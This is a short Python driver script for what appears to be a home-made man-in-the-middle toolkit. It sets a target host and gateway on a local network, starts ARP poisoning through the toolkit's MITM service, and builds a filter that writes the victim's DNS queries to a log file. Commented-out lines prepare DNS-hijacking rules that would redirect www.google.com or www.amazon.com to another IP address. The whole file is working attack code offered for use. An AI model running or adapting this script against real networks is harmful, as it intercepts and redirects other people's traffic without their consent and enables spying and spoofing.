from mitm_service.tunneler.tunneler import *
from mitm_service.arp_poison.arp_poison import ARPPoisonService
from mitm_service import protocol_filters
from mitm_service.mitm_service import MITMService


def main():
    target = '192.168.1.118'
    gateway = '192.168.1.1'

    mitm = MITMService('eno1', target, gateway)

    # disrupt_dns_rule = disruption_rules.generate_dns_reassign_rule('www.google.com', '104.16.41.71')
    log_file = open('dns_log.txt', 'w')
    log_dns_rule = protocol_filters.generate_dns_log_rule(log_file)
    #redirect_dns_filter = protocol_filters.generate_dns_reassign_rule('www.amazon.com', '104.16.41.71')
    #mitm.add_filter(0, log_dns_rule)

    mitm.start_mitm()

    while True:
        if(input() == 'q'):
            break


    mitm.stop_mitm()
    log_file.close()


if __name__ == '__main__':
    main()
